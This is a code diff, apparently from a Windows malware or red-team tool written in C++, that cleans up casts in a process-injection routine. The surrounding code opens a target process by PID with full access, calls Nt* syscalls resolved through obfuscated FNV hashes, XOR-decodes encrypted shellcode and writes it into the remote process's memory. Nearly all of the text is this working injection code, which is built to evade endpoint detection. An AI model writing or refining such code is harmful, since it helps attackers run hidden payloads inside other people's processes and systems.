@@ -33,7 +33,8 @@ int main(int argc, char *argv[]) {
   DWORD PID = std::stoi(argv[1]);
   HANDLE processHandle = NULL;
   OBJECT_ATTRIBUTES objectAttrs = {sizeof(objectAttrs), NULL};
-  CLIENT_ID clientId = {.UniqueProcess = (HANDLE)PID, .UniqueThread = NULL};
+  CLIENT_ID clientId = {.UniqueProcess = reinterpret_cast<HANDLE>(PID),
+                        .UniqueThread = NULL};
   auto status =
       syscalls.Call(ng::obfuscation::fnv1Const("NtOpenProcess"), &processHandle,
                     PROCESS_ALL_ACCESS, objectAttrs, clientId);
@@ -58,10 +59,10 @@ int main(int argc, char *argv[]) {
 
   // A thread cannot be created if it's context hasn't been initialized(At least
   // it didn't work for me)
-  const char fakebuf[] = "pwned";
-  status =
-      syscalls.Call(ng::obfuscation::fnv1Const("NtWriteVirtualMemory"),
-                    processHandle, buf, (void *)fakebuf, sizeof(fakebuf), NULL);
+  char fakebuf[] = "pwned";
+  status = syscalls.Call(ng::obfuscation::fnv1Const("NtWriteVirtualMemory"),
+                         processHandle, buf, reinterpret_cast<PVOID>(fakebuf),
+                         sizeof(fakebuf), NULL);
   if (!NT_SUCCESS(status)) {
     syscalls.Call(ng::obfuscation::fnv1Const("NtClose"), processHandle);
     throw std::runtime_error(ng::obfuscation::xorDecode(
@@ -86,7 +87,8 @@ int main(int argc, char *argv[]) {
   auto decryptedShellcode =
       ng::obfuscation::hex2bin(ng::obfuscation::xorDecode(encryptedShellcode));
   status = syscalls.Call(ng::obfuscation::fnv1Const("NtWriteVirtualMemory"),
-                         processHandle, buf, (void *)decryptedShellcode.data(),
+                         processHandle, buf,
+                         reinterpret_cast<PVOID>(decryptedShellcode.data()),
                          decryptedShellcode.size(), NULL);
   if (!NT_SUCCESS(status)) {
     syscalls.Call(ng::obfuscation::fnv1Const("NtClose"), processHandle);
